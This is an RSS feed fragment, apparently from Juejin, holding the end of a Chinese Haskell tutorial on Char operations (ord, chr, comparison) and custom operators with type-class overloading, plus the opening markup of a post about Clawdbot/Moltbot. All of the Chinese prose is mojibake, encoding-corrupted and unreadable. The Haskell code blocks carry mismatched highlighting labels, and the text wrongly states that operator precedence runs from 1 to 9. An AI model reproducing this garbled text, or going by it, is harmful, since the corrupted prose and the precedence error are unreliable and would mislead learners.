<li><strong>ä»£ç æ›´ç®€æ´</strong>ï¼šæ— éœ€é¢å¤–çš„æ¡ä»¶åˆ†æ”¯ï¼Œç”¨ä¸€è¡Œå¸ƒå°”è¡¨è¾¾å¼å³å¯å®ç°ã€Œå®‰å…¨æ ¡éªŒ+ä¸šåŠ¡é€»è¾‘ã€ï¼Œè´´åˆå£°æ˜å¼ç¼–ç¨‹çš„ç®€æ´æ€§è¦æ±‚ã€‚</li>
</ol>
<h2 data-id="heading-10">3 å­—ç¬¦è¿ç®—</h2>
<p>Haskell ä¸­å­—ç¬¦ä¸º<strong>Charç±»å‹</strong>ï¼ˆå•å¼•å·åŒ…è£¹ï¼Œå¦‚ <code>'a'</code>ã€<code>'ä¸­'</code>ï¼‰ï¼Œæ˜¯å¼ºç±»å‹ä¸å¯å˜å€¼ï¼Œ<strong>ç¦æ­¢å­—ç¬¦ä¸æ•°å€¼çš„éšå¼ç®—æœ¯è¿ç®—</strong>ï¼ˆå¦‚ <code>'a' + 1</code> ç¼–è¯‘æŠ¥é”™ï¼‰ï¼Œæ‰€æœ‰å­—ç¬¦è¿ç®—å‡å›´ç»•ã€Œç±»å‹å®‰å…¨ã€å±•å¼€ï¼Œæ ¸å¿ƒè§„åˆ™å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>å­—ç¬¦ä¸ç¼–ç è½¬æ¢</strong>ï¼šé€šè¿‡ <code>ord c</code>ï¼ˆå­—ç¬¦â†’Unicode/ASCIIç ï¼Œè¿”å›Intï¼‰ã€<code>chr n</code>ï¼ˆUnicode/ASCIIç â†’å­—ç¬¦ï¼Œè¿”å›Charï¼‰å®ç°ï¼Œéœ€å¯¼å…¥ <code>Data.Char</code> æ¨¡å—ï¼›</li>
<li><strong>å­—ç¬¦æ¯”è¾ƒ</strong>ï¼šç›´æ¥ä½¿ç”¨ <code>==</code>/<code>&lt;</code>/<code>&gt;</code> ç­‰è¿ç®—ç¬¦ï¼ŒæŒ‰<strong>Unicodeç å€¼</strong>å¤§å°æ¯”è¾ƒï¼›</li>
<li><strong>æ ¸å¿ƒç‰¹æ€§</strong>ï¼šåŸç”Ÿæ”¯æŒUnicodeå­—ç¬¦é›†ï¼Œæ— éœ€é¢å¤–å¤„ç†ä¸­æ–‡ã€æ—¥æ–‡ç­‰éè‹±æ–‡å­—ç¬¦ï¼Œé€‚é…å…¨çƒåŒ–å¼€å‘ã€‚</li>
</ol>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> Data.Char (<span class="hljs-built_in">ord</span>, <span class="hljs-built_in">chr</span>)
<span class="hljs-built_in">ord</span> <span class="hljs-string">'a'</span>  -- ç»“æœï¼š<span class="hljs-number">97</span>ï¼ˆaçš„ASCIIç ï¼‰
<span class="hljs-built_in">ord</span> <span class="hljs-string">'ä¸­'</span> -- ç»“æœï¼š<span class="hljs-number">20013</span>ï¼ˆä¸­çš„Unicodeç ï¼‰
<span class="hljs-built_in">chr</span> <span class="hljs-number">98</span>   -- ç»“æœï¼š<span class="hljs-string">'b'</span>
<span class="hljs-string">'a'</span> &lt; <span class="hljs-string">'b'</span>-- ç»“æœï¼š<span class="hljs-literal">True</span>ï¼ˆæŒ‰ç å€¼æ¯”è¾ƒï¼‰
-- <span class="hljs-string">'a'</span> + <span class="hljs-number">1</span>  -- ç¼–è¯‘æŠ¥é”™ï¼šNo instance <span class="hljs-keyword">for</span> (Num Char)ï¼Œç¦æ­¢éšå¼ç±»å‹è½¬æ¢
</code></pre>
<p><strong>è®¾è®¡æ„ä¹‰</strong>ï¼šåšå®ˆ<strong>å¼ºé™æ€ç±»å‹</strong>åŸåˆ™ï¼Œé¿å…éšå¼è½¬æ¢å¯¼è‡´çš„ç±»å‹æ··ä¹±ï¼ŒåŒæ—¶åŸç”Ÿæ”¯æŒUnicodeï¼Œè®©å­—ç¬¦å¤„ç†æ›´é€šç”¨ã€æ›´å®‰å…¨ã€‚</p>
<h2 data-id="heading-11">4 è‡ªå®šä¹‰è¿ç®—ç¬¦åŸºç¡€</h2>
<p>Haskell ä¸­<strong>è¿ç®—ç¬¦æœ¬è´¨æ˜¯å‡½æ•°</strong>ï¼Œè¿™æ˜¯ã€Œå‡½æ•°æ˜¯ä¸€ç­‰å…¬æ°‘ã€æ ¸å¿ƒè®¾è®¡å“²å­¦çš„æè‡´ä½“ç°â€”â€”å†…ç½®è¿ç®—ç¬¦å¯åƒå‡½æ•°ä¸€æ ·ä½¿ç”¨ï¼Œå¼€å‘è€…ä¹Ÿèƒ½<strong>è‡ªå®šä¹‰ç¬¦åˆä¸šåŠ¡è¯­ä¹‰çš„è¿ç®—ç¬¦</strong>ï¼Œå¹¶é€šè¿‡ç±»å‹ç±»å®ç°<strong>è¿ç®—ç¬¦é‡è½½</strong>ã€‚å…¶è®¾è®¡å›´ç»•<strong>æŠ½è±¡æ€§ã€è¡¨è¾¾æ€§ã€æ‰©å±•æ€§</strong>å±•å¼€ï¼Œæ˜¯ Haskell é€‚åˆå¼€å‘<strong>æ•°å­¦å»ºæ¨¡ã€é¢†åŸŸç‰¹å®šè¯­è¨€ï¼ˆDSLï¼‰</strong> çš„é‡è¦åŸå› ã€‚</p>
<h3 data-id="heading-12">æ ¸å¿ƒåŸºç¡€è§„åˆ™</h3>
<p>è‡ªå®šä¹‰è¿ç®—ç¬¦ä¸å†…ç½®è¿ç®—ç¬¦éµå¾ª<strong>å®Œå…¨ç›¸åŒçš„è§„åˆ™</strong>ï¼Œç¡®ä¿è¯­è¨€è¯­æ³•çš„ä¸€è‡´æ€§ï¼Œæ ¸å¿ƒè§„åˆ™å…±5ç‚¹ï¼Œæ˜¯è‡ªå®šä¹‰å’Œä½¿ç”¨è¿ç®—ç¬¦çš„åŸºç¡€ï¼š</p>
<ol>
<li>
<p><strong>æ„æˆè§„åˆ™</strong>ï¼šä»…èƒ½ç”±<strong>ç¬¦å·å­—ç¬¦</strong>ç»„æˆï¼Œæ”¯æŒ <code>! @ # $ % ^ &amp; * + - . / &lt; &gt; = ? : | \ ~</code> ç­‰ï¼›<strong>ç¦æ­¢ä½¿ç”¨æ‹¬å·ã€é€—å·ã€åˆ†å·ã€ç©ºæ ¼</strong>ç­‰è¯­æ³•ä¸“ç”¨å­—ç¬¦ï¼Œé¿å…ä¸è¯­è¨€è¯­æ³•å†²çªï¼›</p>
</li>
<li>
<p><strong>ä¼˜å…ˆçº§/ç»“åˆæ€§</strong>ï¼šé»˜è®¤ä¼˜å…ˆçº§ä¸º <strong>9</strong>ï¼ˆHaskell è¿ç®—ç¬¦ä¼˜å…ˆçº§å…±1-9çº§ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ï¼‰ï¼Œé»˜è®¤<strong>å·¦ç»“åˆ</strong>ï¼›å¯é€šè¿‡ <code>infixl</code>ï¼ˆå·¦ç»“åˆï¼‰ã€<code>infixr</code>ï¼ˆå³ç»“åˆï¼‰ã€<code>infix</code>ï¼ˆæ— ç»“åˆï¼‰æ˜¾å¼æŒ‡å®šï¼ˆå¦‚ <code>infixl 6 +++</code> è¡¨ç¤º+++ä¸º6çº§ä¼˜å…ˆçº§ã€å·¦ç»“åˆï¼‰ï¼›</p>
</li>
<li>
<p><strong>å®šä¹‰æ–¹å¼</strong>ï¼šä¸æ™®é€šå‡½æ•°<strong>å®Œå…¨ä¸€è‡´</strong>ï¼Œåªéœ€å°†è¿ç®—ç¬¦ç”¨<strong>æ‹¬å·åŒ…è£¹</strong>ä½œä¸ºå‡½æ•°åï¼Œç±»å‹ç­¾åã€å®ç°é€»è¾‘å‡æ— å·®å¼‚ï¼›</p>
</li>
<li>
<p><strong>è°ƒç”¨æ–¹å¼</strong>ï¼šæ”¯æŒä¸¤ç§æ–¹å¼ï¼Œæ— ç¼è¡”æ¥æ™®é€šå‡½æ•°ä½¿ç”¨é€»è¾‘ï¼š</p>
<ol>
<li><strong>ä¸­ç¼€è°ƒç”¨</strong>ï¼ˆé»˜è®¤/å¸¸ç”¨ï¼‰ï¼š<code>æ“ä½œæ•°1 è¿ç®—ç¬¦ æ“ä½œæ•°2</code>ï¼ˆå¦‚ <code>2 +++ 3</code>ï¼‰ï¼Œç¬¦åˆäººç±»çš„è¿ç®—ç›´è§‰ï¼›</li>
<li><strong>å‰ç¼€è°ƒç”¨</strong>ï¼šå°†è¿ç®—ç¬¦ç”¨æ‹¬å·åŒ…è£¹ï¼Œä½œä¸ºæ™®é€šå‡½æ•°è°ƒç”¨ï¼ˆå¦‚ <code>(+++) 2 3</code>ï¼‰ï¼Œæ”¯æŒä½œä¸ºé«˜é˜¶å‡½æ•°å‚æ•°ï¼›</li>
</ol>
</li>
<li>
<p><strong>é‡è½½æ”¯æŒ</strong>ï¼šé€šè¿‡<strong>ç±»å‹ç±»ï¼ˆClassï¼‰</strong> å®ç°ï¼ˆHaskell å”¯ä¸€çš„é‡è½½æ–¹å¼ï¼‰â€”â€”å…ˆå®šä¹‰åŒ…å«è¿ç®—ç¬¦çš„ç±»å‹ç±»ï¼Œå†ä¸ºä¸åŒç±»å‹å®ç°è¯¥ç±»å‹ç±»ï¼Œå³å¯è®©åŒä¸€è¿ç®—ç¬¦ä½œç”¨äºä¸åŒç±»å‹å¹¶æ‰§è¡Œä¸åŒé€»è¾‘ã€‚</p>
</li>
</ol>
<h3 data-id="heading-13">åˆ†åœºæ™¯ç¤ºä¾‹è§£æ</h3>
<h4 data-id="heading-14">åœºæ™¯1ï¼šè‡ªå®šä¹‰ç®€å•è¿ç®—ç¬¦ï¼ˆåŸºç¡€ä½¿ç”¨ï¼Œæ— é‡è½½ï¼‰</h4>
<p><strong>éœ€æ±‚</strong>ï¼šå®šä¹‰è¿ç®—ç¬¦ <code>+++</code>ï¼Œå®ç°ã€Œä¸¤æ•°ç›¸åŠ åå†åŠ 10ã€çš„åŠŸèƒ½ï¼Œä»…æ”¯æŒIntç±»å‹ã€‚</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- å®šä¹‰ï¼šæ‹¬å·åŒ…è£¹+++ä½œä¸ºå‡½æ•°åï¼Œä¸æ™®é€šå‡½æ•°å®šä¹‰å®Œå…¨ä¸€è‡´</span>
(+++) :: Int -&gt; Int -&gt; Int  <span class="hljs-comment">-- ç±»å‹ç­¾åï¼šæ¥æ”¶ä¸¤ä¸ªIntï¼Œè¿”å›ä¸€ä¸ªInt</span>
a +++ b = a + b + <span class="hljs-number">10</span>        <span class="hljs-comment">-- å®ç°é€»è¾‘ï¼šä¸¤æ•°ç›¸åŠ ååŠ 10</span>

<span class="hljs-comment">-- è°ƒç”¨ï¼šä¸­ç¼€è°ƒç”¨ï¼ˆé»˜è®¤ï¼‰+ å‰ç¼€è°ƒç”¨ï¼ˆæ‹¬å·åŒ…è£¹ï¼‰ï¼Œç»“æœç­‰ä»·</span>
main1 :: IO ()
main1 = <span class="hljs-keyword">do</span>
  <span class="hljs-built_in">print</span> (<span class="hljs-number">2</span> +++ <span class="hljs-number">3</span>)   <span class="hljs-comment">-- ä¸­ç¼€è°ƒç”¨ï¼Œ2+3+10=15 â†’ è¾“å‡º15</span>
  <span class="hljs-built_in">print</span> ((+++) <span class="hljs-number">2</span> <span class="hljs-number">3</span>) <span class="hljs-comment">-- å‰ç¼€è°ƒç”¨ï¼Œç­‰ä»·äºæ™®é€šå‡½æ•°è°ƒç”¨ â†’ è¾“å‡º15</span>
</code></pre>
<p><strong>æ ¸å¿ƒè¦ç‚¹</strong>ï¼šè‡ªå®šä¹‰ç®€å•è¿ç®—ç¬¦çš„æœ¬è´¨æ˜¯ã€Œ<strong>å¸¦æ‹¬å·çš„å‡½æ•°å</strong>ã€ï¼Œå®šä¹‰å’Œè°ƒç”¨çš„åº•å±‚é€»è¾‘ä¸æ™®é€šå‡½æ•°æ— åŒºåˆ«ï¼Œä»…ä¹¦å†™å½¢å¼ä¸åŒã€‚</p>
<h4 data-id="heading-15">åœºæ™¯2ï¼šè‡ªå®šä¹‰è¿ç®—ç¬¦é‡è½½ï¼ˆé€šè¿‡ç±»å‹ç±»ï¼Œæ”¯æŒå¤šç±»å‹ï¼‰</h4>
<p><strong>éœ€æ±‚</strong>ï¼šè®© <code>+++</code> åŒæ—¶æ”¯æŒIntå’ŒDoubleç±»å‹ï¼Œå®ç°ã€Œç›¸åŠ ååŠ 10ã€ï¼ˆIntåŠ 10ï¼ŒDoubleåŠ 10.0ï¼‰ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">-- æ­¥éª¤<span class="hljs-number">1</span>ï¼šå®šä¹‰ç±»å‹ç±»Add10ï¼ŒåŒ…å«è¿ç®—ç¬¦+++ï¼ˆé‡è½½çš„æ ¸å¿ƒå‰æï¼‰
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Add10</span> <span class="hljs-title">a</span> <span class="hljs-title">where</span>  -- <span class="hljs-title">a</span>æ˜¯ç±»å‹å˜é‡ï¼Œè¡¨ç¤ºä»»æ„ç¬¦åˆè¯¥ç±»å‹ç±»çš„ç±»å‹
  (+++) :: a -&gt; a -&gt; a  -- è¿ç®—ç¬¦ç±»å‹ç­¾åï¼šåŒç±»å‹å…¥å‚ï¼ŒåŒç±»å‹å‡ºå‚

-- æ­¥éª¤<span class="hljs-number">2</span>ï¼šä¸º<span class="hljs-built_in">Int</span>ç±»å‹å®ç°Add10ç±»å‹ç±»ï¼ˆå®šåˆ¶<span class="hljs-built_in">Int</span>ç±»å‹çš„+++é€»è¾‘ï¼‰
instance Add10 <span class="hljs-built_in">Int</span> <span class="hljs-keyword">where</span>
  a +++ b = a + b + <span class="hljs-number">10</span>

-- æ­¥éª¤<span class="hljs-number">3</span>ï¼šä¸º<span class="hljs-built_in">Double</span>ç±»å‹å®ç°Add10ç±»å‹ç±»ï¼ˆå®šåˆ¶<span class="hljs-built_in">Double</span>ç±»å‹çš„+++é€»è¾‘ï¼‰
instance Add10 <span class="hljs-built_in">Double</span> <span class="hljs-keyword">where</span>
  a +++ b = a + b + <span class="hljs-number">10.0</span>

-- è°ƒç”¨ï¼šç¼–è¯‘å™¨è‡ªåŠ¨æ ¹æ®æ“ä½œæ•°ç±»å‹é€‰æ‹©å¯¹åº”å®ç°ï¼Œå®ç°é‡è½½
main2 :: IO ()
main2 = <span class="hljs-keyword">do</span>
  print (<span class="hljs-number">2</span> +++ <span class="hljs-number">3</span>)     -- æ“ä½œæ•°ä¸º<span class="hljs-built_in">Int</span>ï¼Œè°ƒç”¨<span class="hljs-built_in">Int</span>çš„å®ç° â†’ <span class="hljs-number">15</span>
  print (<span class="hljs-number">2.5</span> +++ <span class="hljs-number">3.5</span>) -- æ“ä½œæ•°ä¸º<span class="hljs-built_in">Double</span>ï¼Œè°ƒç”¨<span class="hljs-built_in">Double</span>çš„å®ç° â†’ <span class="hljs-number">16.0</span>
</code></pre>
<p><strong>æ ¸å¿ƒè¦ç‚¹</strong>ï¼šHaskell çš„è¿ç®—ç¬¦é‡è½½<strong>åŸºäºç±»å‹ç±»å®ç°</strong>ï¼Œè€Œéä¼ ç»Ÿè¯­è¨€çš„ç›´æ¥é‡è½½ï¼Œè¿™è®©é‡è½½æ›´è§„èŒƒï¼ŒåŒæ—¶ç¬¦åˆå¼ºç±»å‹è®¾è®¡ï¼Œç¼–è¯‘å™¨å¯åœ¨ç¼–è¯‘æœŸä¸¥æ ¼æ ¡éªŒç±»å‹åŒ¹é…ï¼Œé¿å…é‡è½½å¯¼è‡´çš„ç±»å‹æ··ä¹±ã€‚</p>
<h4 data-id="heading-16">åœºæ™¯3ï¼šè‡ªå®šä¹‰å¤šç¬¦å·è¿ç®—ç¬¦ï¼ˆè´´åˆä¸šåŠ¡è¯­ä¹‰ï¼Œç®€åŒ–ä»£ç ï¼‰</h4>
<p><strong>éœ€æ±‚</strong>ï¼šå®šä¹‰è¿ç®—ç¬¦ <code>***</code>ï¼Œå®ç°ã€Œä¸¤æ•°ç›¸ä¹˜åå†å¹³æ–¹ã€çš„åŠŸèƒ½ï¼Œä»…æ”¯æŒIntç±»å‹ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å®šä¹‰ï¼šå¤šç¬¦å·ç»„åˆä½œä¸ºè¿ç®—ç¬¦ï¼Œå®ç°é€»è¾‘è´´åˆä¸šåŠ¡éœ€æ±‚</span>
(<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>) :: <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-type">Int</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-type">Int</span>
a <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> b <span class="hljs-operator">=</span> (a <span class="hljs-operator">*</span> b) <span class="hljs-operator">^</span> <span class="hljs-number">2</span>  <span class="hljs-comment">-- å…ˆç›¸ä¹˜ï¼Œå†ç”¨^2æ±‚å¹³æ–¹</span>

<span class="hljs-comment">-- è°ƒç”¨ï¼šä¸­ç¼€è°ƒç”¨ï¼Œç®€æ´ç›´è§‚ï¼Œæ¯”æ™®é€šå‡½æ•°æ›´è´´åˆè®¡ç®—ç›´è§‰</span>
main3 :: IO ()
main3 <span class="hljs-operator">=</span> print (<span class="hljs-number">3</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">4</span>)  <span class="hljs-comment">-- (3*4)Â²=144 â†’ è¾“å‡º144</span>
</code></pre>
<p><strong>æ ¸å¿ƒè¦ç‚¹</strong>ï¼šè‡ªå®šä¹‰è¿ç®—ç¬¦æ”¯æŒ<strong>å•ä¸ªæˆ–å¤šä¸ªç¬¦å·ç»„åˆ</strong>ï¼Œå¯æ ¹æ®ä¸šåŠ¡/é¢†åŸŸè¯­ä¹‰çµæ´»è®¾è®¡ï¼Œè®©ä»£ç ä»ã€Œæ™®é€šå‡½æ•°è°ƒç”¨ã€è½¬åŒ–ä¸ºã€Œé¢†åŸŸä¸“å±è¡¨è¾¾å¼ã€ï¼Œæå‡å¯è¯»æ€§ã€‚</p>
<h3 data-id="heading-17">è®¾è®¡åˆè¡·ï¼šå¹¶éè¯­æ³•ç‚«æŠ€ï¼Œè€Œæ˜¯è§£å†³å®é™…è¡¨è¾¾ç¼ºé™·</h3>
<p>Haskell è®¾è®¡è‡ªå®šä¹‰è¿ç®—ç¬¦ï¼Œæ ¸å¿ƒæ˜¯ä¸ºäº†è§£å†³<strong>æ™®é€šå‡½æ•°åœ¨ç‰¹å®šåœºæ™¯ä¸‹çš„è¡¨è¾¾ä¸è¶³</strong>ï¼ŒåŒæ—¶è´´åˆè¯­è¨€çš„æ ¸å¿ƒè®¾è®¡å“²å­¦ï¼Œå¹¶éå•çº¯çš„è¯­æ³•æ‹“å±•ï¼š</p>
<ol>
<li><strong>è½åœ°å‡½æ•°ä¸€ç­‰å…¬æ°‘æ€æƒ³</strong>ï¼šæ—¢ç„¶å‡½æ•°æ˜¯ä¸€ç­‰å…¬æ°‘ï¼ˆå¯å®šä¹‰ã€ä¼ é€’ã€å¤ç”¨ï¼‰ï¼Œé‚£ä¹ˆä½œä¸ºã€Œä¸­ç¼€å½¢å¼å‡½æ•°ã€çš„è¿ç®—ç¬¦ï¼Œä¹Ÿåº”æ”¯æŒè‡ªå®šä¹‰ï¼Œè®©è¯­è¨€è®¾è®¡æ›´å®Œæ•´ã€ä¸€è‡´ï¼›</li>
<li><strong>æå‡é¢†åŸŸè¯­ä¹‰è¡¨è¾¾èƒ½åŠ›</strong>ï¼šåœ¨æ•°å­¦å»ºæ¨¡ã€é‡‘èé‡åŒ–ã€DSLå¼€å‘ç­‰åœºæ™¯ï¼Œæ™®é€šå‡½æ•°çš„å‰ç¼€è°ƒç”¨ï¼ˆå¦‚ <code>add10 2 3</code>ï¼‰ä¸å¦‚ä¸­ç¼€è¿ç®—ç¬¦ï¼ˆå¦‚ <code>2 +++ 3</code>ï¼‰ç›´è§‚ï¼Œè‡ªå®šä¹‰è¿ç®—ç¬¦å¯è®©ä»£ç <strong>ç›´æ¥è´´åˆé¢†åŸŸçš„æ•°å­¦å…¬å¼/ä¸šåŠ¡è¯­ä¹‰</strong>ï¼›</li>
<li><strong>å¼ºç±»å‹ä¸‹çš„çµæ´»é‡è½½</strong>ï¼šä¼ ç»Ÿè¯­è¨€çš„è¿ç®—ç¬¦é‡è½½æ˜“å¯¼è‡´ç±»å‹æ··ä¹±ï¼ŒHaskell é€šè¿‡ç±»å‹ç±»å®ç°é‡è½½ï¼Œè®©é‡è½½æ—¢çµæ´»åˆç¬¦åˆå¼ºé™æ€ç±»å‹è®¾è®¡ï¼Œä¿éšœç¼–è¯‘æœŸç±»å‹å®‰å…¨ï¼›</li>
<li><strong>ä¿æŒè¯­æ³•ä¸€è‡´æ€§</strong>ï¼šè‡ªå®šä¹‰è¿ç®—ç¬¦ä¸å†…ç½®è¿ç®—ç¬¦éµå¾ªå®Œå…¨ç›¸åŒçš„è§„åˆ™ï¼Œå¼€å‘è€…æ— éœ€å­¦ä¹ æ–°è¯­æ³•ï¼Œé™ä½ä½¿ç”¨æˆæœ¬ï¼ŒåŒæ—¶è®©ä»£ç é£æ ¼æ›´ç»Ÿä¸€ã€‚</li>
</ol>
<h3 data-id="heading-18">è®¾è®¡å¥½å¤„ï¼šæŠ½è±¡æ€§ã€çµæ´»æ€§ã€å®ç”¨æ€§ä¸‰é‡æå‡</h3>
<ol>
<li>
<p><strong>è¯­è¨€è¡¨è¾¾èƒ½åŠ›æå¼º</strong>ï¼šå¯æ ¹æ®<strong>ä¸šåŠ¡/é¢†åŸŸéœ€æ±‚</strong>å®šä¹‰è´´åˆè¯­ä¹‰çš„è¿ç®—ç¬¦ï¼Œè®©ä»£ç æ›´ç®€æ´ã€ç›´è§‚ï¼Œå°¤å…¶é€‚åˆï¼š</p>
<ol>
<li>æ•°å­¦å»ºæ¨¡ï¼šç›´æ¥å®šä¹‰å‘é‡åŠ æ³•ã€çŸ©é˜µä¹˜æ³•ç­‰æ•°å­¦è¿ç®—ç¬¦ï¼Œè®©ä»£ç ä¸æ•°å­¦å…¬å¼ä¸€è‡´ï¼›</li>
<li>DSLå¼€å‘ï¼šä¸ºç‰¹å®šé¢†åŸŸï¼ˆå¦‚å‰ç«¯æ¨¡æ¿ã€æ¸¸æˆå¼€å‘ã€é‡‘èé‡åŒ–ï¼‰è®¾è®¡ä¸“å±è¿ç®—ç¬¦ï¼Œæ‰“é€ é¢†åŸŸä¸“å±çš„ç®€æ´è¯­æ³•ï¼›</li>
<li>å¤æ‚è®¡ç®—ï¼šå°†å¤šæ­¥å¤åˆè®¡ç®—å°è£…ä¸ºè¿ç®—ç¬¦ï¼Œç®€åŒ–ä»£ç ï¼ˆå¦‚ <code>3 *** 4</code> æ›¿ä»£ <code>(3*4)^2</code>ï¼‰ã€‚</li>
</ol>
</li>
<li>
<p><strong>ä»£ç æŠ½è±¡æ€§æ›´é«˜</strong>ï¼šè¿ç®—ç¬¦æœ¬è´¨æ˜¯ã€Œä¸­ç¼€å½¢å¼çš„å‡½æ•°ã€ï¼Œè‡ªå®šä¹‰è¿ç®—ç¬¦å¯å°†<strong>é‡å¤çš„å¤åˆè®¡ç®—é€»è¾‘</strong>å°è£…ä¸ºä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå®ç°ä»£ç çš„æŠ½è±¡å’Œå¤ç”¨ï¼ŒåŒæ—¶ä¸­ç¼€å½¢å¼æ›´ç¬¦åˆäººç±»çš„è®¡ç®—ç›´è§‰ã€‚</p>
</li>
<li>
<p><strong>çµæ´»æ€§ä¸å¤ç”¨æ€§å¼º</strong>ï¼š</p>
<ol>
<li>æ”¯æŒ<strong>å¤šç±»å‹é‡è½½</strong>ï¼šé€šè¿‡ç±»å‹ç±»è®©åŒä¸€è¿ç®—ç¬¦é€‚é…ä¸åŒç±»å‹ï¼Œé¿å…ä¸ºä¸åŒç±»å‹å®šä¹‰ä¸åŒåç§°çš„å‡½æ•°ï¼ˆå¦‚æ— éœ€å®šä¹‰ <code>add10Int</code>ã€<code>add10Double</code>ï¼‰ï¼Œæå‡ä»£ç å¤ç”¨æ€§ï¼›</li>
<li>æ”¯æŒ<strong>é«˜é˜¶å‡½æ•°ä¼ å‚</strong>ï¼šé€šè¿‡å‰ç¼€è°ƒç”¨ï¼ˆæ‹¬å·åŒ…è£¹ï¼‰ï¼Œè‡ªå®šä¹‰è¿ç®—ç¬¦å¯åƒæ™®é€šå‡½æ•°ä¸€æ ·ä½œä¸ºé«˜é˜¶å‡½æ•°çš„å‚æ•°ï¼ˆå¦‚ <code>map (+++ 10) [1,2,3]</code>ï¼‰ï¼Œæ— ç¼è¡”æ¥ Haskell çš„å‡½æ•°å¼ç¼–ç¨‹èŒƒå¼ã€‚</li>
</ol>
</li>
<li>
<p><strong>ä¸å†…ç½®è¿ç®—ç¬¦è§„åˆ™ç»Ÿä¸€</strong>ï¼šè‡ªå®šä¹‰è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ã€ç»“åˆæ€§ã€è°ƒç”¨æ–¹å¼ä¸å†…ç½®è¿ç®—ç¬¦å®Œå…¨ä¸€è‡´ï¼Œå¼€å‘è€…æ— éœ€é¢å¤–è®°å¿†ç‰¹æ®Šè§„åˆ™ï¼Œå›¢é˜Ÿåä½œæ—¶çš„ä»£ç ç†è§£å’Œç»´æŠ¤æˆæœ¬æ›´ä½ã€‚</p>
</li>
<li>
<p><strong>è¯­æ³•æ‰©å±•æ— é™åˆ¶</strong>ï¼šåªè¦éµå®ˆç¬¦å·æ„æˆè§„åˆ™ï¼Œå¯å®šä¹‰ä»»æ„æ•°é‡ã€ä»»æ„ç¬¦å·ç»„åˆçš„è¿ç®—ç¬¦ï¼Œè®©è¯­è¨€èƒ½é€‚é…<strong>ä»»æ„é¢†åŸŸçš„éœ€æ±‚</strong>ï¼Œæ— éœ€ç­‰å¾…è¯­è¨€å®˜æ–¹å‡çº§ï¼Œæå‡è¯­è¨€çš„å¯æ‰©å±•æ€§ã€‚</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Clawdbotæ”¹åMoltbotï¼šå½“ Claude ä¸å†åªæ˜¯èŠå¤©ï¼Œè€Œæ˜¯ä¸€ä¸ªçœŸæ­£å¯è½åœ°çš„ AI Bot]]></title>    <link>https://juejin.cn/post/7600355625475080244</link>    <guid>https://juejin.cn/post/7600355625475080244</guid>    <pubDate>2026-01-29T08:21:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600355625475080244" data-draft-id="7600345782173958178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Clawdbotæ”¹åMoltbotï¼šå½“ Claude ä¸å†åªæ˜¯èŠå¤©ï¼Œè€Œæ˜¯ä¸€ä¸ªçœŸæ­£å¯è½åœ°çš„ AI Bot"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-29T08:21:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ç‹®æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/4270935854300888"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Clawdbotæ”¹åMoltbotï¼šå½“ Claude ä¸å†åªæ˜¯èŠå¤©ï¼Œè€Œæ˜¯ä¸€ä¸ªçœŸæ­£å¯è½åœ°çš„ AI Bot
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4270935854300888/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ç‹®æŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:21:14.000Z" title="Thu Jan 29 2026 08:21:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
